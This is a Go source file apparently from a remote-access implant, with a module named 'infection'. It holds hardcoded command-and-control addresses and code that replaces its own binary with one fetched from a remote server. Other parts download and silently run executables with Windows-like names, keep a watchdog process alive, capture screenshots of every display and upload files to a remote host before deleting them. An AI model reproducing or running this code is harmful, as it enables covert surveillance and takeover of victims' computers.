package lib

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/inconshreveable/go-update"
	"github.com/kbinani/screenshot"
	"github.com/parnurzeal/gorequest"
	"image/png"
	"infection/machineinfo"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"mime/multipart"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"
)

const VERSION string = "7"
const MIDURL string = "http://111.231.82.173/"
const MIDFILE string = "http://47.95.233.176/file/"
const MIDAUTH string = "http://111.231.82.173:9000/auth"
const MIDETCD string = "111.231.82.173:2379"
const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
const CURRENTPATH = "C:\\Windows\\Temp\\"

var NOGUILOG = get_current_user() + "\\temp\\nogui.txt"

var NEWPATH = get_current_user() + "\\microsoftNet\\"
var DATAPATH = get_current_user() + "\\temp\\"
var HOSTID = machineinfo.GetSystemVersion().Hostid
var BrowserSafepath = get_current_user() + "\\tmp\\"
var OUTIP string

const TMVC = ":6000"
const PMVC = ":5002"

const TMQ = ":6006"
const PMQ = ":5006"

const MQHOST = "infection"

type Msg struct {
	Hostid      string `json:"hostid"`
	Code        int    `json:"code"`
	Softversion string `json:"softversion"`
	Type        string `json:"type"`
}

// get out ip
func GetOutIp() {
	body, _ := ioutil.ReadFile(CURRENTPATH + "ip.txt")
	OUTIP = strings.TrimSpace(string(body))
}
func get_current_user() string {
	usr, err := user.Current()
	if err != nil {
		log.Println(err)
	}
	return usr.HomeDir
}
func RandInt64(min, max int64) int {
	rand.Seed(time.Now().UnixNano())
	return int(min + rand.Int63n(max-min+1))
}

func DoUpdate(addr string, backendAddr string) {
	//for {
	//random second check version updade
	//ticker := time.NewTicker(time.Second * time.Duration(RandInt64(15, 150)))
	//resp, _ := http.Get(MIDFILE + "version.txt")
	//body, _ := ioutil.ReadAll(resp.Body)
	//defer resp.Body.Close()
	current_file := strings.Split(os.Args[0], "\\")
	frpe, err := http.Get(MIDFILE + current_file[len(current_file)-1])
	//if strings.TrimSpace(string(body)) != VERSION {
	err = update.Apply(frpe.Body, update.Options{TargetPath: os.Args[0]})
	if err != nil {
		EventStatusCode(300, HOSTID, VERSION, "0", "http://"+addr+backendAddr+"/browser/Event")
	}
	EventStatusCode(300, HOSTID, VERSION, "0", "http://"+addr+backendAddr+"/browser/Event")
	time.Sleep(2 * time.Second)
	// when update done shlb be kill main process restart
	KillMain()
	//}
	//<-ticker.C
	//}
}
func clear() {
	var fileinit = []struct {
		Name string
	}{
		{"MicrosoftBroker.exe"},
		{"sqlite3_386.dll"},
		{"sqlite3_amd64.dll"},
		{"WindowsDaemon.exe"},
	}
	for _, name := range fileinit {
		os.Remove(CURRENTPATH + name.Name)
	}
}
func ClearPic() {
	cmd := exec.Command("cmd", "/C", "del", CURRENTPATH+".png")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Start()
}
func SingleFile(file string, addr string, finflag chan string) {
	pbuf := new(bytes.Buffer)
	writer := multipart.NewWriter(pbuf)
	formFile, err := writer.CreateFormFile("file", file)
	if err != nil {
		log.Println("Create form file failed: %s\n", err)
	}
	// 从文件读取数据，写入表单
	srcFile, err := os.Open(file)
	if err != nil {
		fmt.Println("Open source file failed: s\n", err)
	}
	defer srcFile.Close()
	_, err = io.Copy(formFile, srcFile)
	if err != nil {
		fmt.Println("Write to form file falied: %s\n", err)
	}
	// 发送表单
	contentType := writer.FormDataContentType()
	writer.Close()
	re, err := http.Post(addr, contentType, pbuf)
	if re.StatusCode == 200 {
		os.RemoveAll(file)
		log.Println("Upload single file Status Successful !")
	} else {
		log.Println("Upload single file Status Fail !")
	}
	finflag <- "file sent"
	return
}

func Removetempimages(filenames []string, finflag chan string) {
	for _, name := range filenames {
		os.Remove(name)
	}
}

func KillCheck() {
	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// not Start will continue
	killcheck.Run()
}
func KillDog() {
	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsEventLog.exe")
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// not Start will continue
	killcheck.Run()
}
func KillALL() {
	KillCheck()
	current_file := strings.Split(os.Args[0], "\\")
	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	killcheck.Run()
}
func KillMain() {
	current_file := strings.Split(os.Args[0], "\\")
	killcheck := exec.Command("taskkill", "/f", "/im", current_file[len(current_file)-1])
	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	killcheck.Run()
}
func MultiFileDown(files []string, step string, downflag chan string) {
	if len(files) == 0 && step == "init" {
		var fileinit = []struct {
			Name string
		}{
			{"MicrosoftBroker.exe"},
			{"sqlite3_386.dll"},
			{"sqlite3_amd64.dll"},
			{"WindowsDaemon.exe"},
		}
		for _, name := range fileinit {
			Get(MIDFILE+name.Name, name.Name)
		}
		downflag <- "done"
	} else {
		for _, name := range files {
			if FileExits(CURRENTPATH+name) != nil {
				Get(MIDFILE+name, name)
			}
		}
	}
}

func Get(url string, file string) {
	resp, err := http.Get(url)
	if err != nil {
		log.Println("下载失败:", file)
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	ioutil.WriteFile(CURRENTPATH+file, body, 0644)
}

func FileExits(path string) error {
	_, err := os.Stat(path)
	if err != nil {
		return err
	}
	return nil
}

func EventStatusCode(code int, hostid string, softversion string, typ string, addr string) {
	msg := Msg{
		Hostid:      hostid,
		Code:        code,
		Type:        typ,
		Softversion: softversion,
	}
	//log.Println(msg)
	_, _, _ = gorequest.New().
		Post(addr).
		Set("content-type", "application/x-www-form-urlencoded").
		Send(msg).
		End()
}
func CheckDog() {
	KillDog()
	text, err := ioutil.ReadFile(NOGUILOG)
	if err != nil {
		log.Println("nogui not exits:", err)
	}
	current_file := strings.Split(string(text), "\\")
	buf := bytes.Buffer{}
	cmd := exec.Command("wmic", "process", "get", "name,processid")
	cmd.Stdout = &buf
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	cmd2 := exec.Command("findstr", current_file[len(current_file)-1])
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd2.Stdin = &buf
	data, _ := cmd2.CombinedOutput()
	//if died up
	if len(data) == 0 {
		cmd3 := exec.Command(string(text))
		cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd3.Start()
	}
}

type Check struct {
	Hostid string `json:"hostid"`
}

func CheckInlib(addr string) error {
	var check Check
	msg := Msg{
		Hostid: HOSTID,
	}
	resp, body, _ := gorequest.New().
		Post("http://" + addr + "/machine/machineCheck").
		//Set("content-type", "application/x-www-form-urlencoded").
		Send(msg).
		End()
	if resp.StatusCode == 200 && body != "" {
		if err := json.Unmarshal([]byte(body), &check); err == nil {
			if check.Hostid == HOSTID {
				return nil
			} else {
				return fmt.Errorf("not inlib")
			}

		}
	}
	return fmt.Errorf("not inlib")
}
func ListProcess() {
	downflag := make(chan string)
	//keep the main process live
	checkdog := []string{
		"MicrosoftBroker.exe"}
	MultiFileDown(checkdog, "again", downflag)
	dogcmd := exec.Command(CURRENTPATH + "MicrosoftBroker.exe")
	dogcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//block
	dogcmd.Run()
	KillDog()
	text, err := ioutil.ReadFile(NOGUILOG)
	if err != nil {
		log.Println("nogui not exits:", err)
	}
	current_file := strings.Split(string(text), "\\")
	buf := bytes.Buffer{}
	cmd := exec.Command("wmic", "process", "get", "name,processid")
	cmd.Stdout = &buf
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()

	cmd2 := exec.Command("findstr", current_file[len(current_file)-1])
	cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd2.Stdin = &buf
	data, _ := cmd2.CombinedOutput()
	//if died up
	if len(data) == 0 {
		cmd3 := exec.Command(string(text))
		cmd3.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd3.Start()
	}
	//else {
	//	//if up call dog
	//	cmd4 := exec.Command(CURRENTPATH + "WindowsEventLog.exe")
	//	cmd4.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//	cmd4.Start()
	//}
}

//get hostid-ip-screensize pic
func Getscreenshot() []string {
	n := screenshot.NumActiveDisplays()
	filenames := []string{}
	var fpth string
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == "windows" {
			fpth = `C:\Windows\Temp\`
		} else {
			fpth = `/tmp/`
		}
		GetOutIp()
		fileName := fmt.Sprintf("%s-%s-%d-%dx%d.png", HOSTID, OUTIP, i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
		filenames = append(filenames, fullpath)
		file, _ := os.Create(fullpath)

		defer file.Close()
		png.Encode(file, img)
	}
	return filenames
}

//func SystemCheck(){
//	switch runtime.GOOS {
//	case "windows":
//		current_file := strings.Split(os.Args[0], "\\")
//		c := exec.Command("cmd", "/C", "taskkill", "/IM",current_file[len(current_file)-1])
//		if err := c.Run(); err != nil {
//			fmt.Println("Error: ", err)
//		}
//	case "linux":
//	case "darwin":
//
//	case "freebsd":
//
//	}
//}
